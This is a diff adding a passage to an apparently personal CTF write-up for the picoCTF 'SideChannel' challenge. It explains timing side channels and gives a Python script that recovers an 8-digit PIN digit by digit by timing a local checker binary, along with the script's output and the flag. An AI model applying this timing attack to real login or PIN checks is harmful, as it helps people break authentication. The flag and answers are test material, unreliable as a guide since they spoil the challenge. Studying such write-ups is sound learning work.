@@ -615,3 +615,60 @@ The flag contained a hex code, which i decoded using https://dcode.fr/en and got
 ![alt text](Extras/mobpsycho_flag.png)
 
 
+## SideChannel {HARD}
+
+Flag: ```picoCTF{t1m1ng_4tt4ck_914c5ec3}```
+
+Hints Used: 3
+
+In this chall, my initial approach was to run ```checksec``` and ```file``` to get info, since it was a binary file.
+
+After running ghidra and decomiling the file, i realized this approach was useless, and the same was mentioned in the hints.
+
+in Hint-1, there was a mention of timing based-side channel attacks.
+
+Timing based side channels are basically exploiting the usage of equal to operand in python,```==```.
+
+How it works is, that it compares the string from 0th index till nth index,
+in doing so, if a string fails at 0th index, it would've taken x ms, but if a string fails at the 2nd index, it would've taken x + dx ms time.
+
+(I checked this by comparing the real pin and a random pin as the input, the random pin gave an output within a split second, whereas, it took some 5-10ms to print the output in the real pin, signifying a timing attack vuln.)
+
+Therefore, using this idea, i tried writing my own exploit, but since im not that good with python, i took help of some videos online related to the same challenge, and edited the code so that it would work.
+
+here is the exploit:
+```
+from time import * 
+from subprocess import *
+
+pin = list("00000000") #changed it from 99999999, since it kept generating a new output everytime i ran it.
+
+times = []
+
+for i in range (8):
+    for j in range(10):
+        pin[i]=str(j)
+        p = Popen("./pin_checker", stdin=PIPE, stdout=PIPE, universal_newlines=True, shell=True)
+        start = time()
+        out = p.communicate(input=''.join(pin))[0]
+        times.append(time()-start)
+    pin[i]=str(times.index(max(times)))
+    times=[]
+    print(''.join(pin))
+```
+
+here is the output for the exploit:
+```
+40000000
+48000000
+48300000
+48390000
+48390000
+48390500
+48390510
+48390513 #final pin
+```
+
+It took a decently long time to print the output, around 10-30s.
+
+giving the pin as the input on the remote connection gave me the flag.
